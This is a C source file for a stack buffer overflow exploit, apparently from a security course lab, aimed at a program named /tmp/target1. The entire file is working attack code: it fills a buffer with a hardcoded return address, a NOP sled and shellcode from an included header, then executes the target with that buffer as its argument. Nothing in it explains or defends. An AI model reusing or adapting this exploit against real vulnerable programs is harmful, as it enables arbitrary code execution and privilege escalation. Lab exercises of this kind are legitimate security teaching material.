#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define BUFSIZE 300
#define EVILADDR 0xbffffc48
#define NOP 0x90
#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  char evil_buf[BUFSIZE];
  long *addr_ptr;
  int i;

  addr_ptr = (long *)evil_buf;

  for (i = 0; i < (BUFSIZE/4); ++i) {
    *(addr_ptr + i) = (long)EVILADDR;
  }

  for (i = 0; i < 100; ++i) {
    evil_buf[i] = NOP;
  }

  for (i = 0; i < strlen(shellcode); ++i) {
    evil_buf[i + 100] = shellcode[i];
  }

  evil_buf[BUFSIZE - 1] = '\0';

  args[0] = TARGET;
  args[1] = evil_buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
